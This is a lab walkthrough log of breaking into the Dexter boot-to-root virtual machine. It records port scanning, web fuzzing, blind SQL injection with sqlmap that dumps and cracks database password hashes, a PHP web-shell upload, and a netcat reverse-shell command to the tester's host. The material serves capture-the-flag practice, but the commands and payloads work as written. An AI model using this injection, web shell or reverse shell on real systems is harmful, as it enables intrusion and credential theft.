@@ -1,0 +1,430 @@
+$ sudo nmap -sS 192.168.56.0/24
+Password:
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2016-08-01 17:00 EDT
+
+Nmap scan report for 192.168.56.101
+Host is up (0.00073s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+111/tcp open  rpcbind
+MAC Address: 08:00:27:BC:C2:B3 (Cadmus Computer Systems)
+
+
+spider with burpsuite
+	404 robots.txt
+	200 gateway.php
+	
+indicates stuff there i'm not seeing, brute force to the rescue!
+
+this uses a seclists payload, hides 404 responses, and outputs results to a file. 
+	
+Sassinak:wfuzz warrenkopp$ ./wfuzz.py -w ../seclists/Discovery/Web_Content/Common_PHP_Filenames.txt --hc 404 http://192.168.56.101/Panel/FUZZ > today.txt
+Sassinak:wfuzz warrenkopp$ cat today.txt 
+********************************************************
+* Wfuzz 2.1.3 - The Web Bruteforcer                      *
+********************************************************
+
+Target: http://192.168.56.101/Panel/FUZZ
+Total requests: 5172
+
+==================================================================
+ID	Response   Lines      Word         Chars          Request    
+==================================================================
+
+00001:  C=200      7 L	      18 W	    234 Ch	  "index.php"
+00008:  C=200      0 L	       0 W	      0 Ch	  "config.php"
+00036:  C=200      2 L	       0 W	      4 Ch	  "main.php"
+00120:  C=200      1 L	       0 W	      2 Ch	  "info.php"
+00453:  C=200      0 L	       0 W	      0 Ch	  "load.php"
+03324:  C=200     12 L	      45 W	    385 Ch	  "master.php"
+05161:  C=200     20 L	      43 W	    514 Ch	  "upload.php"
+05162:  C=200      7 L	       7 W	     90 Ch	  "pagination.php"
+
+Total time: 8.183780
+Processed Requests: 5172
+Filtered Requests: 5164
+Requests/sec.: 631.9817
+
+master.php has what appears to be a command interface. quick test with commix says not so much. also have to learn when/why to escape bash strings. 
+
+
+Sassinak:commix warrenkopp$ ./commix.py  --url="http://192.168.56.101/Panel/master.php?command=ls+&Value=-ls&submit=SET!" -p="command","Value"
+-bash: !": event not found
+Sassinak:commix warrenkopp$ ./commix.py  --url="http://192.168.56.101/Panel/master.php?command=ls+&Value=-ls&submit=SET\!"
+                                       __           
+   ___    ___     ___ ___     ___ ___ /\_\   __  _   
+  /'___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  1.2.22-dev
+ /\ \__//\ \L\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
+ \ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ 
+  \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject) 
+
++--
+Automated All-in-One OS Command Injection and Exploitation Tool
+Copyright (c) 2014-2016 Anastasios Stasinopoulos (@ancst)
++--
+
+[*] Checking connection to the target URL... [ SUCCEED ]
+[*] Setting the GET parameter 'command' for tests.
+[*] Testing the classic injection technique... [ FAILED ]
+[*] Testing the eval-based code injection technique... [ FAILED ]
+[*] Testing the time-based injection technique... [ FAILED ]
+[*] Trying to create a file in '/var/www/Panel/'... 
+[!] Warning: It seems that you don't have permissions to read and/or write files in '/var/www/Panel/'.
+[?] Do you want to try the temporary directory (/tmp/) [Y/n/q] > y
+[*] Trying to create a file, in temporary directory (/tmp/)...
+[*] Testing the tempfile-based injection technique... [ FAILED ]
+[!] Warning: The tested GET parameter 'command' seems to be not injectable.
+[*] Setting the GET parameter 'Value' for tests.
+[*] Testing the classic injection technique... [ FAILED ]
+[*] Testing the eval-based code injection technique... [ FAILED ]
+[*] Testing the time-based injection technique... [ FAILED ]
+[*] Trying to create a file in '/var/www/Panel/'... 
+[!] Warning: It seems that you don't have permissions to read and/or write files in '/var/www/Panel/'.
+[?] Do you want to try the temporary directory (/tmp/) [Y/n/q] > y
+[*] Trying to create a file, in temporary directory (/tmp/)...
+[*] Testing the tempfile-based injection technique... [ FAILED ]
+[!] Warning: The tested GET parameter 'Value' seems to be not injectable.
+[*] Setting the GET parameter 'submit' for tests.
+[*] Testing the classic injection technique... [ FAILED ]
+[*] Testing the eval-based code injection technique... [ FAILED ]
+[*] Testing the time-based injection technique... [ FAILED ]
+[*] Trying to create a file in '/var/www/Panel/'... 
+[!] Warning: It seems that you don't have permissions to read and/or write files in '/var/www/Panel/'.
+[?] Do you want to try the temporary directory (/tmp/) [Y/n/q] > y
+[*] Trying to create a file, in temporary directory (/tmp/)...
+[*] Testing the tempfile-based injection technique... [ FAILED ]
+[!] Warning: The tested GET parameter 'submit' seems to be not injectable.
+[x] Critical: All tested parameters appear to be not injectable. Try to use the option '--alter-shell' and/or try to increase '--level' values to perform more tests (i.e 'User-Agent', 'Referer', 'Cookie' etc).
+
+other writeups tell me there's sqli on gateway.php, but all link to the same exploit, https://www.exploit-db.com/exploits/31686/. Which is written by the guy that wrote the VM. 
+i put in a lot of practice with sqlmap and got nothin. IDK what he's doing in that script enough to reverse it inot another approach. Nearest i can tell he's 
+hitting page and val parameters with something base64 encoded. but i can't replicate. 
+
+
+Sassinak:sqlmap warrenkopp$ ./sqlmap.py -u "http://192.168.56.101/Panel/gateway.php?page=test&val=test" --identify-waf --tamper greatest,charencode
+         _
+ ___ ___| |_____ ___ ___  {1.0.8.15#dev}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 12:26:53
+
+[12:26:53] [INFO] loading tamper script 'greatest'
+[12:26:53] [INFO] loading tamper script 'charencode'
+[12:26:54] [INFO] testing connection to the target URL
+[12:26:54] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection
+[12:26:54] [WARNING] WAF/IDS/IPS product hasn't been identified
+[12:26:54] [INFO] testing if the target URL is stable
+[12:26:55] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
+[12:26:55] [INFO] testing if GET parameter 'page' is dynamic
+[12:26:55] [WARNING] GET parameter 'page' does not appear dynamic
+[12:26:55] [WARNING] heuristic (basic) test shows that GET parameter 'page' might not be injectable
+[12:26:55] [INFO] testing for SQL injection on GET parameter 'page'
+[12:26:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[12:26:55] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
+[12:26:55] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[12:26:55] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[12:26:55] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'
+[12:26:55] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[12:26:55] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[12:26:55] [INFO] testing 'MySQL inline queries'
+[12:26:55] [INFO] testing 'PostgreSQL inline queries'
+[12:26:55] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[12:26:55] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
+[12:26:55] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[12:26:55] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[12:26:55] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[12:26:55] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[12:26:55] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[12:26:55] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'
+[12:26:55] [INFO] testing 'Oracle AND time-based blind'
+[12:26:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[12:26:55] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it with option '--dbms'
+[12:26:56] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
+[12:26:56] [WARNING] GET parameter 'page' is not injectable
+[12:26:56] [INFO] testing if GET parameter 'val' is dynamic
+[12:26:56] [WARNING] GET parameter 'val' does not appear dynamic
+[12:26:56] [WARNING] heuristic (basic) test shows that GET parameter 'val' might not be injectable
+[12:26:56] [INFO] testing for SQL injection on GET parameter 'val'
+[12:26:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[12:26:56] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
+[12:26:56] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[12:26:56] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[12:26:56] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'
+[12:26:56] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[12:26:57] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[12:26:57] [INFO] testing 'MySQL inline queries'
+[12:26:57] [INFO] testing 'PostgreSQL inline queries'
+[12:26:57] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[12:26:57] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
+[12:26:57] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[12:26:57] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[12:26:57] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[12:26:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[12:26:57] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[12:26:57] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'
+[12:26:57] [INFO] testing 'Oracle AND time-based blind'
+[12:26:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[12:26:57] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
+[12:26:58] [WARNING] GET parameter 'val' is not injectable
+[12:26:58] [CRITICAL] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp')
+[12:26:58] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+
+[*] shutting down at 12:26:58
+
+
+
+...
+following the trail further, this is a bit more significant than a simple boot2root vm. https://blog.cylance.com/a-study-in-bots-dexter-pos-botnet-malware
+dang. however he does explain how to use sqlmap to get the DB. lets try to replicate. 
+
+$ ./sqlmap.py -u "http://192.168.56.101/Panel/gateway.php" --data="val=AA%3D%3D&page=" --tamper base64encode --level 3
+
+finally gives me results, and if i'm reading the blog post and source code right, the app is taking the key, AA==, and the data input through the 
+"page" parameter, decrypting/decoding, then sending that data to mysql
+
+15:15:32] [INFO] POST parameter 'page' appears to be 'MySQL >= 5.0.12 AND time-based blind (comment)' injectable 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) and risk (1) values? [Y/n] y
+[15:16:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[15:16:45] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[15:16:46] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[15:16:46] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[15:16:46] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[15:16:46] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[15:16:46] [INFO] checking if the injection point on POST parameter 'page' is a false positive
+[15:17:16] [WARNING] there is a possibility that the target (or WAF) is dropping 'suspicious' requests
+POST parameter 'page' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 4644 HTTP(s) requests:
+---
+Parameter: page (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (comment)
+    Payload: val=AA==&page=%' AND SLEEP(5)#
+---
+[15:21:36] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[15:21:36] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 7.0 (wheezy)
+web application technology: Apache 2.2.22, PHP 5.4.4
+back-end DBMS: MySQL >= 5.0.12
+[15:21:36] [INFO] fetched data logged to text files under '/Users/warrenkopp/.sqlmap/output/192.168.56.101'
+
+[*] shutting down at 15:21:36
+
+so now we know an entry point, time to get all we can from it. ...holy crap this takes a long time. 
+tried this attack, 
+
+$ ./sqlmap.py -u "http://192.168.56.101/Panel/gateway.php" --data="val=AA%3D%3D&page=" --tamper base64encode --identify-waf --dbms mysql --current-user --current-db --users --passwords 
+
+after running for 20 minutes, i've got root@localhost and the dbname is nasprojec...
+hopefully sleeping the laptop doesn't kill it. (update: macs rock. sleeping the laptop pauses & resumes everything.)
+
+lots of time involved to brute force a blind sqli. snippets below show the results. 
+
+
+Sassinak:sqlmap warrenkopp$ ./sqlmap.py -u "http://192.168.56.101/Panel/gateway.php" --data="val=AA%3D%3D&page=" --tamper base64encode --identify-waf --dbms mysql --current-user --current-db --users --passwords 
+         _
+ ___ ___| |_____ ___ ___  {1.0.8.15#dev}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 15:28:44
+
+[15:28:44] [INFO] loading tamper script 'base64encode'
+[15:28:44] [WARNING] provided value for parameter 'page' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[15:28:44] [INFO] testing connection to the target URL
+[15:28:44] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection
+[15:28:45] [WARNING] WAF/IDS/IPS product hasn't been identified
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: page (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (comment)
+    Payload: val=AA==&page=%' AND SLEEP(5)#
+---
+[15:28:45] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[15:28:45] [INFO] testing MySQL
+[15:28:45] [INFO] confirming MySQL
+[15:28:45] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 7.0 (wheezy)
+web application technology: Apache 2.2.22, PHP 5.4.4
+back-end DBMS: MySQL >= 5.0.0
+[15:28:45] [INFO] fetching current user
+current user:    'root@localhost'
+[16:00:52] [INFO] fetching current database
+[16:00:52] [INFO] retrieved: nasprojec
+[09:24:06] [ERROR] invalid character detected. retrying..
+[09:24:06] [WARNING] increasing time delay to 2 seconds 
+t
+current database:    'nasproject'
+[09:26:36] [INFO] fetching database users
+[09:26:36] [INFO] fetching number of database users
+[09:26:36] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)                                                           
+5
+[09:27:37] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)                                                           
+'root
+[11:04:00] [ERROR] invalid character detected. retrying..
+[11:04:00] [WARNING] increasing time delay to 3 seconds 
+'@'localhost'
+[12:03:42] [INFO] retrieved: 'root'@'dexter'
+[12:34:43] [INFO] retrieved: 'root'@'12
+
+[15:04:19] [INFO] fetching database users
+[15:04:19] [INFO] fetching number of database users
+[15:04:19] [INFO] resumed: 5
+[15:04:19] [INFO] resumed: 'root'@'localhost'
+[15:04:19] [INFO] resumed: 'root'@'dexter'
+[15:04:19] [INFO] resuming partial value: 'root'@'12
+
+database management system users [5]:
+[*] 'debian-sys-maint'@'localhost'
+[*] 'root'@'127.0.0.1'
+[*] 'root'@'::1'
+[*] 'root'@'dexter'
+[*] 'root'@'localhost'
+
+[08:44:55] [INFO] fetching database users password hashes
+[08:44:55] [INFO] fetching database users
+[08:44:55] [INFO] fetching number of password hashes for user 'root'
+[08:44:55] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)                                                           
+1
+[08:45:26] [INFO] fetching password hashes for user 'root'
+[08:45:26] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)                                                           
+*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
+[09:46:29] [INFO] fetching number of password hashes for user 'debian-sys-maint'
+[09:46:29] [INFO] retrieved: 1
+[09:46:59] [INFO] fetching password hashes for user 'debian-sys-maint'
+[09:46:59] [INFO] retrieved: *BDE9D5DC64375262E4559449F728695598D30713
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[10:55:16] [INFO] writing hashes to a temporary file '/var/folders/5p/70h7mpkn5cbb7h1cwbzs1sl00000gn/T/sqlmapiB0EGb988/sqlmaphashes-vFyOv7.txt' 
+do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] y
+[10:55:20] [INFO] using hash method 'mysql_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/Users/warrenkopp/githubs/sqlmap/txt/wordlist.zip' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 
+[10:55:26] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] y
+[10:55:39] [INFO] starting dictionary-based cracking (mysql_passwd)
+[10:55:39] [INFO] starting 4 processes 
+[10:55:57] [INFO] cracked password 'password' for user 'root'     
+database management system users password hashes:                                                                                                                                               
+[*] debian-sys-maint [1]:
+    password hash: *BDE9D5DC64375262E4559449F728695598D30713
+[*] root [1]:
+    password hash: *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
+    clear-text password: password
+
+$ ./sqlmap.py -u "http://192.168.56.101/Panel/gateway.php" --data="val=AA%3D%3D&page=" --tamper base64encode --identify-waf --dbms mysql --tables
+
+[14:35:21] [INFO] fetching database names
+[14:35:21] [INFO] fetching number of databases
+[14:35:21] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)                                                           
+[14:35:51] [WARNING] turning off pre-connect mechanism because of connection time out(s)
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
+[14:36:45] [WARNING] it is very important to not stress the network adapter during usage of time-based payloads to prevent potential disruptions 
+4
+[14:36:45] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)                                                           
+[14:37:45] [INFO] adjusting time delay to 1 second due to good response times
+information_schema
+[15:12:16] [INFO] retrieved: mysql
+[15:22:16] [INFO] retrieved: nasproject
+[15:42:48] [INFO] retrieved: performance_schema
+[16:17:20] [INFO] fetching tables for databases: 'information_schema, mysql, nasproject, performance_schema'
+[16:17:20] [INFO] fetching number of tables for database 'nasproject'
+[16:17:20] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)                                                           
+5
+[16:18:20] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)                                                           
+bots
+[16:26:51] [INFO] retrieved: commands
+[16:42:21] [INFO] retrieved: con
+[20:10:57] [ERROR] invalid character detected. retrying..
+[20:10:57] [WARNING] increasing time delay to 2 seconds 
+fig
+[20:16:27] [INFO] retrieved: logs
+[20:25:28] [INFO] retrieved: users
+[20:34:58] [INFO] fetching number of tables for database 'performance_schema'
+[20:34:58] [INFO] retrieved: 17
+[20:36:28] [INFO] retrieved: cond_instances
+[21:04:30] [INFO] retrieved: events_waits_current
+[21:45:32] [INFO] retrieved: events_waits_hi
+[09:00:06] [ERROR] invalid character detected. retrying..
+
+$ ./sqlmap.py -u "http://192.168.56.101/Panel/gateway.php" --data="val=AA%3D%3D&page=" --tamper base64encode --identify-waf --dbms mysql --tables
+
+[09:05:58] [INFO] fetching database names
+[09:05:58] [INFO] fetching number of databases
+[09:05:58] [INFO] resumed: 4
+[09:05:58] [INFO] resumed: information_schema
+[09:05:58] [INFO] resumed: mysql
+[09:05:58] [INFO] resumed: nasproject
+[09:05:58] [INFO] resumed: performance_schema
+[09:05:58] [INFO] fetching tables for databases: 'information_schema, mysql, nasproject, performance_schema'
+[09:05:58] [INFO] fetching number of tables for database 'nasproject'
+[09:05:58] [INFO] resumed: 5
+[09:05:58] [INFO] resumed: bots
+[09:05:58] [INFO] resumed: commands
+[09:05:58] [INFO] resumed: config
+[09:05:58] [INFO] resumed: logs
+[09:05:58] [INFO] resumed: users
+[09:05:58] [INFO] fetching number of tables for database 'performance_schema'
+[09:05:58] [INFO] resumed: 17
+[09:05:58] [INFO] resumed: cond_instances
+[09:05:58] [INFO] resumed: events_waits_current
+[09:05:58] [INFO] resuming partial value: events_waits_hi
+
+
+[09:14:25] [INFO] fetching columns for table 'users' in database 'nasproject'
+[09:14:25] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)                                                           
+[09:14:25] [WARNING] it is very important to not stress the network adapter during usage of time-based payloads to prevent potential disruptions 
+[09:14:55] [WARNING] turning off pre-connect mechanism because of connection time out(s)
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
+2
+[09:15:35] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)                                                           
+[09:16:05] [INFO] adjusting time delay to 1 second due to good response times
+name
+[09:22:36] [INFO] retrieved: password
+[09:39:36] [INFO] fetching entries for table 'users' in database 'nasproject'
+[09:39:36] [INFO] fetching number of entries for table 'users' in database 'nasproject'
+[09:39:36] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)                                                           
+1
+[09:40:07] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)                                                           
+loserbotter
+[10:03:08] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)                                                           
+if i had any real talent, i would make money legitimately
+
+upload.php, when authenticated works!
+
+upload webshells/simple_backdoor.php
+
+http://192.168.83.1/CasinoLoader/load.php?request=simple-backdoor?cmd=ls
+
+ta-da
+
+returning to previous tools, use nc to get a better interaction level with the vm. 
+
+http://192.168.56.101/Panel/exes/simple-backdoor.php?cmd=/bin/nc -e /bin/sh 192.168.56.1 2222
+
+that works, need viable privilege escalation since examples for antitamper.py 
+ARENT' FUCKING WORKING. 
+
+french blog says that crontab is running antitamper.py ever other minute. cannot verify from VM, but can browse .vmdk 
+with http://vmxray.com. proves out. /var/spool/cron/crontabs/root/ has this entry: 
+
+*/1 * * * * python /var/www/antitamper.py
+
+so it fucking should be running ever other minute. but no reverse shell. w.t.f.
+
+commas are fucking important. goddamnit. 
+
